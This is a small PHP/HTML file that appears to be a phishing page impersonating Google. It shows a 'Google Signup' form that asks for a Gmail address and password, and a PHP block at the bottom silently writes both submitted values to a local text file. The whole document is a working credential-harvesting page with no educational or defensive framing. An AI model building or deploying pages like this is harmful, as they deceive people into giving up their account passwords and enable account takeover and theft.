<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Sign Up Form</title>
        <link rel="stylesheet" href="css/normalize.css">
        <link href='http://fonts.googleapis.com/css?family=Nunito:400,300' rel='stylesheet' type='text/css'>
        <link rel="stylesheet" href="css/main.css">
    </head>
    <body>
        <h1><?php echo 'Google Signup'; ?></h1>
        <form action="index.php" method="post">
            <label for="name">
                Enter Gmail ID
            </label>
            <input type="email" id="name" name="user_name">
          <label for="Password">
                Enter Gmail Password
            </label>
            <input type="password" id="password" name="user_password">
            <button type="submit">Log In!</button>
        </form>
      
      <?php
          if (isset($_POST['user_name'], $_POST['user_password'])){
            $name = $_POST['user_name'];
            $lang = $_POST['user_password'];
            $file = 'file.txt';
            $fh = fopen($file, 'r+') or die('Cannot open file: '.$file);
            $data = $name;
            $data = $data.$lang;
            fwrite($fh, $data);
            fclose($fh);
          }
      ?>
    </body>
</html>